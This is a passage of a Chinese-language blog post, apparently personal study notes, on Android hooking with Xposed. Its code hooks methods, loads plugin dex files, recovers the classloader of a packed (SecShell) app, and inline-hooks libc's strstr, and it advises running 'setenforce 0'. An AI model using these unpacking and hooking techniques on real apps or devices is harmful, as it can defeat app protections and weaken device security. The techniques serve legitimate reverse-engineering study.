class="hljs-string">&quot;s1lenc3_4&quot;</span>, result4);<br><br><span class="hljs-comment">//通过hook构造函数获取实例</span><br>Class bookclass=lpparam.classLoader.loadClass(<span class="hljs-string">&quot;com.example.s0_test.book&quot;</span>);<br>XposedHelpers.findAndHookConstructor(bookclass, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>    String result1 = (String) XposedHelpers.callMethod(param.thisObject, <span class="hljs-string">&quot;publicmethod&quot;</span>);<br>    Method privatemethod = bookclass.getDeclaredMethod(<span class="hljs-string">&quot;privatemethod&quot;</span>);<br>    privatemethod.setAccessible(<span class="hljs-keyword">true</span>);<br>    String result2 = (String) privatemethod.invoke(param.thisObject);<br>    Log.e(<span class="hljs-string">&quot;s1lenc3_1&quot;</span>, result1);<br>    Log.e(<span class="hljs-string">&quot;s1lenc3_2&quot;</span>, result2);<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">//通过hook参数获取实例</span><br>Class bookclass=lpparam.classLoader.loadClass(<span class="hljs-string">&quot;com.example.s0_test.book&quot;</span>);<br>XposedHelpers.findAndHookMethod(bookclass, <span class="hljs-string">&quot;getStr&quot;</span>, bookclass, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>    String result1 = (String) XposedHelpers.callMethod(param.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;publicmethod&quot;</span>);<br>    Method privatemethod = bookclass.getDeclaredMethod(<span class="hljs-string">&quot;privatemethod&quot;</span>);<br>    privatemethod.setAccessible(<span class="hljs-keyword">true</span>);<br>    String result2 = (String) privatemethod.invoke(param.args[<span class="hljs-number">0</span>]);<br>    Log.e(<span class="hljs-string">&quot;s1lenc3_1&quot;</span>, result1);<br>    Log.e(<span class="hljs-string">&quot;s1lenc3_2&quot;</span>, result2);<br>  &#125;<br><br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="xposed-hook-插件dex与壳dex"><a href="#xposed-hook-插件dex与壳dex" class="headerlink" title="xposed hook 插件dex与壳dex"></a>xposed hook 插件dex与壳dex</h1><h2 id="实现动态加载dex"><a href="#实现动态加载dex" class="headerlink" title="实现动态加载dex"></a>实现动态加载dex</h2><ul><li>制作插件类</li><li>自定义dexclassloader实现插件类的加载</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>&#123;<br>     <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);<br>     setContentView(R.layout.activity_main);<br>     DexClassLoader dexClassLoader = <span class="hljs-keyword">new</span> DexClassLoader(<span class="hljs-string">&quot;/sdcard/2.dex&quot;</span>, <span class="hljs-keyword">this</span>.getCacheDir().getAbsolutePath(), <span class="hljs-keyword">null</span>, <span class="hljs-keyword">this</span>.getClassLoader());<br>     <span class="hljs-keyword">try</span> &#123;<br>         Class s1lenc3 = dexClassLoader.loadClass(<span class="hljs-string">&quot;com.example.class1.s1lenc3&quot;</span>);<br>         Method s1 = s1lenc3.getDeclaredMethod(<span class="hljs-string">&quot;s1&quot;</span>);<br>         s1.invoke(<span class="hljs-keyword">null</span>);<br>     &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;<br>         e.printStackTrace();<br>     &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>         e.printStackTrace();<br>     &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>         e.printStackTrace();<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="插件dex中类的hook"><a href="#插件dex中类的hook" class="headerlink" title="插件dex中类的hook"></a>插件dex中类的hook</h2><ul><li>实现插件dex</li><li>切换classloader</li><li>使用该classloader实例加载插件类 </li><li>hook函数</li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">获取类列表：<br><span class="hljs-function"><span class="hljs-title">basedexclassloader</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">pathlist</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">dexElements</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">dexFile</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">entries</span>-&gt;</span><br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">classbyclassloader</span><span class="hljs-params">(ClassLoader loader)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>       Class basedexclass=loader.loadClass(<span class="hljs-string">&quot;dalvik.system.BaseDexClassLoader&quot;</span>);<br>       Field pathlist=basedexclass.getDeclaredField(<span class="hljs-string">&quot;pathList&quot;</span>);<br>       pathlist.setAccessible(<span class="hljs-keyword">true</span>);<br>       Object pathlistobj=pathlist.get(loader);<br><br>       Class pathlistclass=loader.loadClass(<span class="hljs-string">&quot;dalvik.system.DexPathList&quot;</span>);<br>       Field elements=pathlistclass.getDeclaredField(<span class="hljs-string">&quot;dexElements&quot;</span>);<br>       elements.setAccessible(<span class="hljs-keyword">true</span>);<br>       Object[] elementsobj= (Object[]) elements.get(pathlistobj);<br><br>       <span class="hljs-keyword">for</span>(Object a:elementsobj)&#123;<br>           Class elementclass=loader.loadClass(<span class="hljs-string">&quot;dalvik.system.DexPathList$Element&quot;</span>);<br>           Field dexfile=elementclass.getDeclaredField(<span class="hljs-string">&quot;dexFile&quot;</span>);<br>           dexfile.setAccessible(<span class="hljs-keyword">true</span>);<br>           DexFile dexfileobj= (DexFile) dexfile.get(a);<br>           Enumeration&lt;String&gt; b=dexfileobj.entries();<br>           <span class="hljs-keyword">while</span>(b.hasMoreElements())&#123;<br>               String sj=b.nextElement();<br>               Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, sj);<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>       <span class="hljs-keyword">if</span> (lpparam.packageName.equals(<span class="hljs-string">&quot;com.example.load_dex&quot;</span>)) &#123;<br>           classbyclassloader(lpparam.classLoader);<br>           Class myclass=lpparam.classLoader.loadClass(<span class="hljs-string">&quot;dalvik.system.DexClassLoader&quot;</span>);<br>           <span class="hljs-comment">//  DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent)</span><br>           XposedHelpers.findAndHookConstructor(myclass, String.class, String.class, String.class, ClassLoader.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>               <span class="hljs-meta">@Override</span><br>               <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                   <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>               &#125;<br><br>               <span class="hljs-meta">@Override</span><br>               <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                   <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                   Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, ((DexClassLoader)param.thisObject).toString());<br>                   classbyclassloader((ClassLoader) param.thisObject);<br>                   Class s1class=((DexClassLoader)param.thisObject).loadClass(<span class="hljs-string">&quot;com.example.class1.s1lenc3&quot;</span>);<br>                   XposedHelpers.findAndHookMethod(s1class, <span class="hljs-string">&quot;s1&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                       <span class="hljs-meta">@Override</span><br>                       <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                           <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                           Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>,<span class="hljs-string">&quot;i am from s1lenc3&quot;</span>);<br>                       &#125;<br><br>                       <span class="hljs-meta">@Override</span><br>                       <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                           <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                           Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>,<span class="hljs-string">&quot;s1lenc3 over&quot;</span>);<br>                       &#125;<br>                   &#125;);<br>               &#125;<br>           &#125;);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="壳函数hook"><a href="#壳函数hook" class="headerlink" title="壳函数hook"></a>壳函数hook</h2><ul><li>通过classloader反射出类列表发现只有壳中的类</li><li>通过hook onCreate </li><li>通过反射拿到修正之后的classloader</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//通过反射获取classloader</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> ClassLoader <span class="hljs-title">getloader</span><span class="hljs-params">(ClassLoader loader)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, InvocationTargetException, IllegalAccessException, NoSuchMethodException </span>&#123;<br>        Class activitythreadclass=loader.loadClass(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>);<br>        Method currentactivity=activitythreadclass.getDeclaredMethod(<span class="hljs-string">&quot;currentActivityThread&quot;</span>);<br>        currentactivity.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object activityThreadobj=currentactivity.invoke(<span class="hljs-keyword">null</span>);<br><br>        Field application=activitythreadclass.getDeclaredField(<span class="hljs-string">&quot;mInitialApplication&quot;</span>);<br>        application.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object applicationobj=application.get(activityThreadobj);<br><br>        Class applicationclass=loader.loadClass(<span class="hljs-string">&quot;android.app.Application&quot;</span>);<br>        Field loadedapk=applicationclass.getDeclaredField(<span class="hljs-string">&quot;mLoadedApk&quot;</span>);<br>        loadedapk.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object loadedapkobj=loadedapk.get(applicationobj);<br><br>        Class loadedapkclass=loader.loadClass(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>);<br>        Field mclassloader=loadedapkclass.getDeclaredField(<span class="hljs-string">&quot;mClassLoader&quot;</span>);<br>        mclassloader.setAccessible(<span class="hljs-keyword">true</span>);<br>        ClassLoader classloaderobj= (ClassLoader) mclassloader.get(loadedapkobj);<br><span class="hljs-keyword">return</span>  classloaderobj;<br>    &#125;<br><span class="hljs-comment">//通过xposed api获取classloader</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> ClassLoader <span class="hljs-title">getloader1</span><span class="hljs-params">(ClassLoader loader)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>  Class activitythreadclass=loader.loadClass(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>);<br>  Object activityobj= XposedHelpers.callStaticMethod(activitythreadclass,<span class="hljs-string">&quot;currentActivityThread&quot;</span>);<br><br>  Object mInitialApplication=XposedHelpers.getObjectField(activityobj,<span class="hljs-string">&quot;mInitialApplication&quot;</span>);<br>  Object mLoadedApk=XposedHelpers.getObjectField(mInitialApplication,<span class="hljs-string">&quot;mLoadedApk&quot;</span>);<br><br>  ClassLoader mClassLoader= (ClassLoader) XposedHelpers.getObjectField(mLoadedApk,<span class="hljs-string">&quot;mClassLoader&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> mClassLoader;<br>&#125;<br><span class="hljs-comment">//通过反射获取类列表</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">classbyclassloader</span><span class="hljs-params">(ClassLoader loader)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class basedexclass=loader.loadClass(<span class="hljs-string">&quot;dalvik.system.BaseDexClassLoader&quot;</span>);<br>        Field pathlist=basedexclass.getDeclaredField(<span class="hljs-string">&quot;pathList&quot;</span>);<br>        pathlist.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object pathlistobj=pathlist.get(loader);<br><br>        Class pathlistclass=loader.loadClass(<span class="hljs-string">&quot;dalvik.system.DexPathList&quot;</span>);<br>        Field elements=pathlistclass.getDeclaredField(<span class="hljs-string">&quot;dexElements&quot;</span>);<br>        elements.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] elementsobj= (Object[]) elements.get(pathlistobj);<br><br>        <span class="hljs-keyword">for</span>(Object a:elementsobj)&#123;<br>            Class elementclass=loader.loadClass(<span class="hljs-string">&quot;dalvik.system.DexPathList$Element&quot;</span>);<br>            Field dexfile=elementclass.getDeclaredField(<span class="hljs-string">&quot;dexFile&quot;</span>);<br>            dexfile.setAccessible(<span class="hljs-keyword">true</span>);<br>            DexFile dexfileobj= (DexFile) dexfile.get(a);<br>            Enumeration&lt;String&gt; b=dexfileobj.entries();<br>            <span class="hljs-keyword">while</span>(b.hasMoreElements())&#123;<br>                Log.e(<span class="hljs-string">&quot;r0ysues&quot;</span>, b.nextElement());<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//通过xposed api获取类列表</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">classbyclassloader1</span><span class="hljs-params">(ClassLoader loader)</span></span>&#123;<br>   Object pathlistobj=XposedHelpers.getObjectField(loader,<span class="hljs-string">&quot;pathList&quot;</span>);<br>   Object[] dexelementsobj= (Object[]) XposedHelpers.getObjectField(pathlistobj,<span class="hljs-string">&quot;dexElements&quot;</span>);<br>    <span class="hljs-keyword">for</span>(Object a:dexelementsobj)&#123;<br>        DexFile dexfileobj= (DexFile) XposedHelpers.getObjectField(a,<span class="hljs-string">&quot;dexFile&quot;</span>);<br>        Enumeration&lt;String&gt; b=dexfileobj.entries();<br>        <span class="hljs-keyword">while</span>(b.hasMoreElements())&#123;<br>            Log.e(<span class="hljs-string">&quot;r0ysues&quot;</span>, b.nextElement());<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//通过hook oncrate</span><br>   XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.SecShell.SecShell.AW&quot;</span>, lpparam.classLoader, <span class="hljs-string">&quot;onCreate&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>           <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>       &#125;<br><br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>           <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br><br>           ClassLoader myloader=getloader(lpparam.classLoader);<br>           Class teacherclass=myloader.loadClass(<span class="hljs-string">&quot;com.roysue.myr0.teacher&quot;</span>);<br><br>           ClassLoader myclassloader=getloader1(lpparam.classLoader);<br>           XposedHelpers.findAndHookMethod(teacherclass, <span class="hljs-string">&quot;getString&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>               <span class="hljs-meta">@Override</span><br>               <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                   <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>               &#125;<br><br>               <span class="hljs-meta">@Override</span><br>               <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                   <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                   param.setResult(<span class="hljs-string">&quot;i am hooked&quot;</span>);<br>               &#125;<br>           &#125;);<br>       &#125;<br>   &#125;);<br></code></pre></td></tr></table></figure><h1 id="xposed-hook-native"><a href="#xposed-hook-native" class="headerlink" title="xposed hook native"></a>xposed hook native</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ul><li>编写简单的native函数</li><li>hook时机点，runtime.loadlibiary0()</li></ul><p>一定要设置 setenforce 0</p><p>Inline hook 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span>  (*old_strstr)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *)= <span class="hljs-literal">nullptr</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">new_strstr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-built_in">string</span>,<span class="hljs-keyword">char</span>* mystr)</span></span><br><span class="hljs-function"></span>&#123;__android_log_print(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;s1lenc3&quot;</span>,<span class="hljs-string">&quot;i hook success %s&quot;</span>,mystr);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(mystr,<span class="hljs-string">&quot;s1lenc3&quot;</span>)== <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> old_strstr(<span class="hljs-built_in">string</span>,mystr);;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;      __android_log_print(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;s1lenc3&quot;</span>,<span class="hljs-string">&quot;i hook success &quot;</span>);<br>    <span class="hljs-keyword">void</span> * libcaddr=dlopen(<span class="hljs-string">&quot;libc.so&quot;</span>,RTLD_NOW);<br>    <span class="hljs-keyword">void</span> * strstraddr=dlsym(libcaddr,<span class="hljs-string">&quot;strstr&quot;</span>);<br>    __android_log_print(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;s1lenc3&quot;</span>,<span class="hljs-string">&quot;i hook success %p&quot;</span>,strstraddr);<br>    <span class="hljs-keyword">if</span> (registerInlineHook((<span class="hljs-keyword">uint32_t</span>) strstraddr, (<span class="hljs-keyword">uint32_t</span>) new_strstr, (<span class="hljs-keyword">uint32_t</span> **) &amp;old_strstr) != ELE7EN_OK) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (inlineHook((<span class="hljs-keyword">uint32_t</span>) strstraddr) != ELE7EN_OK) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">JNIEXPORT jstring JNICALL</span><br><span class="hljs-function"><span class="hljs-title">Java_com_example_hook_1so_MainActivity_stringFromJNI</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        JNIEnv* env,</span></span><br><span class="hljs-params"><span class="hljs-function">        jobject <span class="hljs-comment">/* this */</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> hello = <span class="hljs-string">&quot;Hello from C++&quot;</span>;<br>    <span class="hljs-keyword">return</span> env-&gt;NewStringUTF(hello.c_str());<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">JNIEXPORT <span class="hljs-keyword">void</span> JNICALL</span><br><span class="hljs-function"><span class="hljs-title">Java_com_example_hook_1so_sohook_myhookstrstr</span><span class="hljs-params">(JNIEnv *env, jobject thiz)</span> </span>&#123;<br>    hook();<br>&#125;<br></code></pre></td></tr></table></figure><p>生成so文件，然后在java层加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span>(lpparam.packageName.equals(<span class="hljs-string">&quot;com.example.s1_jni&quot;</span>)) &#123;<br>            Class systemclass=lpparam.classLoader.loadClass(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>            XposedBridge.hookAllMethods(systemclass, <span class="hljs-string">&quot;loadLibrary&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                    System.load(<span class="hljs-string">&quot;/data/local/tmp/hookso.so&quot;</span>);<br>                    myhookstrstr();<br>                &#125;<br>            &#125;);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><ul><li>直接加载hook，放在init段中</li><li>hook自己编写的插件so，dlfcn打开绝对路径</li><li>打开libc.so，导入开源框架，执行系统函数得到SDK版本</li><li>64位hook框架inlinehook sandhook，导入hooknative下的所有文件</li></ul><p>hook函数放在init段或者JNI_OnLoad,hook更简化。</p><p><img src="/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20210816113254613.png" alt="image-20210816113254613"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 